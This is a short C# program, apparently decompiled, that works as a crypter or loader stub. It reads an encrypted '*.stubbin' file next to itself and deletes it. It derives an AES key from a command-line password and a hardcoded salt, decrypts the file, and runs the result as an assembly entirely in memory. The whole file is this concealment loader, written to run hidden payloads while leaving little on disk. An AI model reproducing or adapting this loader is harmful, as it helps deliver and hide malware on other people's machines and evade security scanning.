using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace sbjfycvsegfksj;

internal class Program
{
	private static void Main(string[] args)
	{
		if (args.Length != 3)
		{
			return;
		}
		try
		{
			string[] files = Directory.GetFiles(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)!.ToString() + "\\", "*.stubbin");
			byte[] cipherData = File.ReadAllBytes(files[0]);
			if (File.Exists(files[0]))
			{
				File.Delete(files[0]);
			}
			Assembly assembly = Assembly.Load(Decrypt(cipherData, args[0]));
			MethodInfo entryPoint = assembly.EntryPoint;
			if (entryPoint != null)
			{
				string[] array = new string[2]
				{
					args[1],
					args[2]
				};
				object obj = assembly.CreateInstance(entryPoint.Name);
				entryPoint.Invoke(obj, new object[1] { array });
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message + "\r\n" + ex.StackTrace!.ToString());
		}
	}

	public static byte[] Decrypt(byte[] cipherData, byte[] Key, byte[] IV)
	{
		MemoryStream memoryStream = new MemoryStream();
		Rijndael rijndael = Rijndael.Create();
		rijndael.Key = Key;
		rijndael.IV = IV;
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(cipherData, 0, cipherData.Length);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}

	public static byte[] Decrypt(byte[] cipherData, string Password)
	{
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, new byte[13]
		{
			73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
			100, 101, 118
		});
		return Decrypt(cipherData, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16));
	}
}
